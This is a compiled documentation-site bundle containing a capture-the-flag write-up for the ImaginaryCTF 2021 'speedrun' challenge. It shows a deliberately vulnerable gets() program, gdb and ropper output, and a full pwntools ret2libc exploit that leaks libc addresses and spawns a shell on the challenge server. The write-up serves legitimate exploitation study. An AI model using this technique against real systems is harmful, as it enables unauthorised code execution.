"use strict";(self.webpackChunkwriteups_docs=self.webpackChunkwriteups_docs||[]).push([[6216],{3905:(e,n,t)=>{t.d(n,{Zo:()=>c,kt:()=>f});var a=t(7294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function l(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,a,r=function(e,n){if(null==e)return{};var t,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var i=a.createContext({}),p=function(e){var n=a.useContext(i),t=n;return e&&(t="function"==typeof e?e(n):l(l({},n),e)),t},c=function(e){var n=p(e.components);return a.createElement(i.Provider,{value:n},e.children)},d="mdxType",u={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},m=a.forwardRef((function(e,n){var t=e.components,r=e.mdxType,o=e.originalType,i=e.parentName,c=s(e,["components","mdxType","originalType","parentName"]),d=p(t),m=r,f=d["".concat(i,".").concat(m)]||d[m]||u[m]||o;return t?a.createElement(f,l(l({ref:n},c),{},{components:t})):a.createElement(f,l({ref:n},c))}));function f(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var o=t.length,l=new Array(o);l[0]=m;var s={};for(var i in n)hasOwnProperty.call(n,i)&&(s[i]=n[i]);s.originalType=e,s[d]="string"==typeof e?e:r,l[1]=s;for(var p=2;p<o;p++)l[p]=t[p];return a.createElement.apply(null,l)}return a.createElement.apply(null,t)}m.displayName="MDXCreateElement"},9130:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>i,contentTitle:()=>l,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>p});var a=t(7462),r=(t(7294),t(3905));const o={},l="SPEEDRUN",s={unversionedId:"2021/IMAGINARYCTF/challenges/speedrun",id:"2021/IMAGINARYCTF/challenges/speedrun",title:"SPEEDRUN",description:"- File : speedrun.py",source:"@site/docs/2021/IMAGINARYCTF/challenges/speedrun.md",sourceDirName:"2021/IMAGINARYCTF/challenges",slug:"/2021/IMAGINARYCTF/challenges/speedrun",permalink:"/docs/2021/IMAGINARYCTF/challenges/speedrun",draft:!1,editUrl:"https://github.com/Pynard/writeups-docs/tree/main/packages/create-docusaurus/templates/shared/docs/2021/IMAGINARYCTF/challenges/speedrun.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"ROOS_WORLD",permalink:"/docs/2021/IMAGINARYCTF/challenges/roos_world"},next:{title:"SPELLING_TEST",permalink:"/docs/2021/IMAGINARYCTF/challenges/spelling_test"}},i={},p=[{value:"Crafting the payload",id:"crafting-the-payload",level:2},{value:"Finding the libc",id:"finding-the-libc",level:3},{value:"Second payload",id:"second-payload",level:3}],c={toc:p};function d(e){let{components:n,...o}=e;return(0,r.kt)("wrapper",(0,a.Z)({},c,o,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"speedrun"},"SPEEDRUN"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Description\nI've seen some teams solve pwn challenges almost instantly. I'm sure y'all wonder how. Well, you're about to find out!\n\nAttachments\nhttps://imaginaryctf.org/r/4E9F-speedrun.py nc chal.imaginaryctf.org 42020\n")),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"File : ",(0,r.kt)("a",{target:"_blank",href:t(2640).Z},"speedrun.py"))),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},'#!/usr/bin/env python3\n\nimport os\nimport sys\nimport subprocess\nimport base64\nimport random\nimport uuid\nimport time\n\ncode1 = \'\'\'\n#include <stdio.h>\n\nint main(void) {\n    char inp[\'\'\'\n\ncode2 = \'\'\'];\n    setvbuf(stdout,NULL,2,0);\n    setvbuf(stdin,NULL,2,0);\n    gets(inp);\n    puts("Thanks!");\n}\n\'\'\'\n\nart = \'\'\'\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2588\n\u2588\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2588\n\u2588\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2588\n\u2588\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2588\n\u2588\u2591\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2591\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2588\n\u2588\u2591\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2591\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2588\n\u2588\u2592\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2592\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2588\n\u2588\u2592\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2592\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2588\n\u2588\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2588\n\u2588\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2588\n\u2588\u2592\u2592\u2592\u2591\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2591\u2591\u2591\u2588\n\u2588\u2592\u2592\u2592\u2591\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2591\u2591\u2591\u2588\n\u2588\u2591\u2591\u2591\u2592\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2592\u2592\u2592\u2588\n\u2588\u2591\u2591\u2591\u2592\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2592\u2592\u2592\u2588\n\u2588\u2592\u2592\u2592\u2591\u2591\u2591\u2588\u2588\u2588\u2591\u2591\u2591\u2592\u2592\u2592\u2588\u2588\u2588\u2592\u2592\u2592\u2591\u2591\u2591\u2588\n\u2588\u2592\u2592\u2592\u2591\u2591\u2591\u2588\u2588\u2588\u2591\u2591\u2591\u2592\u2592\u2592\u2588\u2588\u2588\u2592\u2592\u2592\u2591\u2591\u2591\u2588\n\u2588\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2588\n\u2588\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\'\'\'\n\ndef compile(size):\n    filename = "/tmp/bin" + str(uuid.uuid4())\n    open(filename + ".c", "w").write(code1 + str(size) + code2)\n    subprocess.run(["gcc", "-o", filename, filename + ".c", "-fno-stack-protector", "-no-pie"], capture_output=True)\n    os.remove(filename + ".c")\n    return filename\n\ndef handler(signum, frame):\n    print("Out of time!")\n\nfilename = compile(random.randint(20,1000))\nbinary = base64.b64encode(open(filename, "rb").read()).decode()\nprint(art)\nprint("I\'ll see you after you defeat the ender dragon!")\n\ntime.sleep(3)\n\nprint("---------------------------BEGIN  DATA---------------------------")\nprint(binary)\nprint("----------------------------END  DATA----------------------------")\n\nsubprocess.run([filename], stdin=sys.stdin, timeout=10)\nos.remove(filename)\n')),(0,r.kt)("p",null,"When we connect via ncat, we receive an ELF 64-bit binary (in base64) from a C code looking like that :"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-c"},'int main(void) {\n    char inp[<random>];\n    setvbuf(stdout,NULL,2,0);\n    setvbuf(stdin,NULL,2,0);\n    gets(inp);\n    puts("Thanks!");\n}\n')),(0,r.kt)("p",null,"At each connection the binary is slightly differrent : the size of ",(0,r.kt)("strong",{parentName:"p"},"inp")," is a random number between 20 and 1000."),(0,r.kt)("p",null,"And we have 10 seconds to spawn a shell and print the flag before the timeout."),(0,r.kt)("p",null,"So the only thing in the payload that will change will be the padding to trigger the buffer overflow."),(0,r.kt)("h2",{id:"crafting-the-payload"},"Crafting the payload"),(0,r.kt)("p",null,"We need to do a ret2libc, to achieve this we need to know what version of libc is used on the server."),(0,r.kt)("h3",{id:"finding-the-libc"},"Finding the libc"),(0,r.kt)("p",null,"To find the libc we will leak libc address of two functions executed before the payload : ",(0,r.kt)("strong",{parentName:"p"},"puts")," and ",(0,r.kt)("strong",{parentName:"p"},"gets")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"puts@plt"),"  address will allow us to print the ",(0,r.kt)("strong",{parentName:"p"},"got")," of our two functions :"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ objdump -d binary\n[...]\n0000000000401030 <puts@plt>:\n  401030:    ff 25 e2 2f 00 00        jmp    *0x2fe2(%rip)        # 404018 <puts@GLIBC_2.2.5>\n  401036:    68 00 00 00 00           push   $0x0\n  40103b:    e9 e0 ff ff ff           jmp    401020 <.plt>\n[...]\n")),(0,r.kt)("p",null,"so ",(0,r.kt)("strong",{parentName:"p"},"puts@plt")," is ",(0,r.kt)("strong",{parentName:"p"},"0x401030"),"\nThen with gdb we will find the got entry for ",(0,r.kt)("strong",{parentName:"p"},"puts")," and ",(0,r.kt)("strong",{parentName:"p"},"gets"),"\nFor ",(0,r.kt)("strong",{parentName:"p"},(0,r.kt)("a",{parentName:"strong",href:"mailto:puts@got.plt"},"puts@got.plt"))," :"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"gdb> r\n[...]\n[-------------------------------------code-------------------------------------]\n   0x401193 <main+81>:    mov    eax,0x0\n   0x401198 <main+86>:    call   0x401040 <gets@plt>\n   0x40119d <main+91>:    lea    rdi,[rip+0xe60]        # 0x402004\n=> 0x4011a4 <main+98>:    call   0x401030 <puts@plt>\n   0x4011a9 <main+103>:    mov    eax,0x0\n   0x4011ae <main+108>:    leave  \n   0x4011af <main+109>:    ret    \n   0x4011b0 <__libc_csu_init>:    push   r15\nGuessed arguments:\narg[0]: 0x402004 --\x3e 0x21736b6e616854 ('Thanks!')\n[...]\n\ngdb> disas 0x401030\nDump of assembler code for function puts@plt:\n   0x0000000000401030 <+0>:    jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 <puts@got.plt>\n   0x0000000000401036 <+6>:    push   0x0\n   0x000000000040103b <+11>:    jmp    0x401020\nEnd of assembler dump.\n")),(0,r.kt)("p",null,"so ",(0,r.kt)("strong",{parentName:"p"},(0,r.kt)("a",{parentName:"strong",href:"mailto:puts@got.plt"},"puts@got.plt"))," is ",(0,r.kt)("strong",{parentName:"p"},"0x404018")),(0,r.kt)("p",null,"Same thing for ",(0,r.kt)("strong",{parentName:"p"},(0,r.kt)("a",{parentName:"strong",href:"mailto:gets@got.plt"},"gets@got.plt"))," : ",(0,r.kt)("strong",{parentName:"p"},"0x404020")),(0,r.kt)("p",null,"Last thing, a ROP gadget to use these addresses in arguments for ",(0,r.kt)("strong",{parentName:"p"},"puts")," :"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ ropper --file binary --search "% rdi"\n[INFO] Load gadgets for section: LOAD\n[LOAD] loading... 100%\n[LOAD] removing double gadgets... 100%\n[INFO] Searching for gadgets: % rdi\n\n[INFO] File: binary\n0x000000000040107a: adc dword ptr [rax], eax; mov rdi, 0x401142; call qword ptr [rip + 0x2f66]; hlt; nop dword ptr [rax + rax]; ret; \n0x0000000000401198: call 0x1040; lea rdi, [rip + 0xe60]; call 0x1030; mov eax, 0; leave; ret; \n0x000000000040119d: lea rdi, [rip + 0xe60]; call 0x1030; mov eax, 0; leave; ret; \n0x0000000000401077: mov ecx, 0x4011b0; mov rdi, 0x401142; call qword ptr [rip + 0x2f66]; hlt; nop dword ptr [rax + rax]; ret; \n0x0000000000401076: mov rcx, 0x4011b0; mov rdi, 0x401142; call qword ptr [rip + 0x2f66]; hlt; nop dword ptr [rax + rax]; ret; \n0x000000000040107d: mov rdi, 0x401142; call qword ptr [rip + 0x2f66]; hlt; nop dword ptr [rax + rax]; ret; \n0x000000000040120b: pop rdi; ret; \n')),(0,r.kt)("p",null,"The last one ",(0,r.kt)("inlineCode",{parentName:"p"},"0x000000000040120b: pop rdi; ret; ")," is what we want\nNow the first payload will look like :"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"[ padding size+0x8 ] [ ROP ] [ puts@got.plt ] [ puts@plt ] [ ROP ] [ gets@got.plt ] [ puts@plt ] [ main ]\n")),(0,r.kt)("p",null,"The last element ",(0,r.kt)("inlineCode",{parentName:"p"},"[ main ]")," will redirect the code to the start of main to allow us to send the second payload to spawn a shell."),(0,r.kt)("p",null,"Launching the script gives us the libc addresses and using ",(0,r.kt)("a",{parentName:"p",href:"https://libc.blukat.me/"},"blukat")," we can get the libc version"),(0,r.kt)("p",null,(0,r.kt)("img",{src:t(4277).Z,title:"unknown.png",width:"1181",height:"636"})),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"File : ",(0,r.kt)("a",{target:"_blank",href:t(5576).Z},"libc6_2.28-10_amd64.so"))),(0,r.kt)("h3",{id:"second-payload"},"Second payload"),(0,r.kt)("p",null,"Now that we know libc offsets and address we can craft the payload to call ",(0,r.kt)("strong",{parentName:"p"},"system('/bin/sh')")),(0,r.kt)("p",null,"The second payload will look like :"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"[ padding size+0x8 ] [ ROP ] [ binsh ] [ system ]\n")),(0,r.kt)("p",null,"The shell is executed and we  just have to send ",(0,r.kt)("inlineCode",{parentName:"p"},"$ cat flag.txt")),(0,r.kt)("p",null,"Here is the script to auto pwn in less than 10 seconds :"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"File : ",(0,r.kt)("a",{target:"_blank",href:t(4602).Z},"exploit.py"))),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},"from pwn import *\n\nimport base64\n\nconn = remote('chal.imaginaryctf.org', 42020)\n\np = log.progress('Receiving binary ')\n\nconn.recvuntil(b'---------------------------BEGIN  DATA---------------------------\\n')\nbinary = base64.b64decode(conn.recvuntil(b'\\n')[:-1])\nconn.recvuntil(b'----------------------------END  DATA----------------------------\\n')\n\np.success('Done')\n\nsize_offset = 0x1149\nsize = struct.unpack('I',binary[size_offset:size_offset+4])[0]\n\nlog.info(f'size = {hex(size)}')\n\n# Craft payload\n\nputs_plt = 0x401030\n\nputs_got = 0x404018\ngets_got = 0x404020 \n\nrop = 0x40120b\n\nmain = 0x401142\n\npayload = b'A'*(size+8)\npayload += struct.pack('Q',rop)\npayload += struct.pack('Q',puts_got)\npayload += struct.pack('Q',puts_plt)\npayload += struct.pack('Q',rop)\npayload += struct.pack('Q',gets_got)\npayload += struct.pack('Q',puts_plt)\npayload += struct.pack('Q',main)\n\nconn.send(payload+b'\\n')\nconn.recvuntil(b'Thanks!\\n')\n\nputs_libc = conn.recv(0x6)+b'\\x00\\x00'\nputs_libc = struct.unpack('Q',puts_libc)[0]\nlog.info('puts_libc @ '+hex(puts_libc))\nconn.recvuntil('\\n')\n\ngets_libc = conn.recv(0x6)+b'\\x00\\x00'\ngets_libc = struct.unpack('Q',gets_libc)[0]\nlog.info('gets_libc @ '+hex(gets_libc))\nlog.info('libc : libc6_2.28-10_amd64')\n\nputs_offset = 0x071910\nlibc_base = puts_libc - puts_offset\nlog.info('libc base : '+hex(libc_base))\n\nsystem_offset = 0x0449c0\nsystem = libc_base + system_offset\nlog.info('system : '+hex(system))\n\nbinsh_offset = 0x181519\nbinsh = libc_base + binsh_offset\nlog.info('/bin/sh : '+hex(binsh))\n\npayload = b'A'*(size+8)\npayload += struct.pack('Q',rop)\npayload += struct.pack('Q',binsh)\npayload += struct.pack('Q',system)\n\nconn.send(payload+b'\\n')\nconn.recvuntil(b'Thanks!\\n')\n\nconn.send(b'cat flag.txt\\n')\nflag = conn.recvall().decode()\nlog.success('flag : '+flag)\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ python exploit.py\n[+] Opening connection to chal.imaginaryctf.org on port 42020: Done\n[+] Receiving binary : Done\n[*] size = 0x290\n[*] puts_libc @ 0x7f487b88c910\n[*] gets_libc @ 0x7f487b88c040\n[*] libc : libc6_2.28-10_amd64\n[*] libc base : 0x7f487b81b000\n[*] system : 0x7f487b85f9c0\n[*] /bin/sh : 0x7f487b99c519\n[+] Receiving all data: Done (42B)\n[*] Closed connection to chal.imaginaryctf.org port 42020\n[+] flag : ictf{4ut0m4t1ng_expl0it_d3v????_b7d75e95}\n")),(0,r.kt)("p",null,"flag : ",(0,r.kt)("inlineCode",{parentName:"p"},"ictf{4ut0m4t1ng_expl0it_d3v????_b7d75e95}")))}d.isMDXComponent=!0},4602:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/files/exploit-7ba8c609377d543b6621b398c4e9341b.py"},5576:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/files/libc6_2.28-10_amd64-a0a0997860ae079d38682567de5c9ed2.so"},2640:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/files/speedrun-8ea1252b2060dca7abfc72e7cb53708e.py"},4277:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/unknown-c7427a7b027bb52476a9d38a17240121.png"}}]);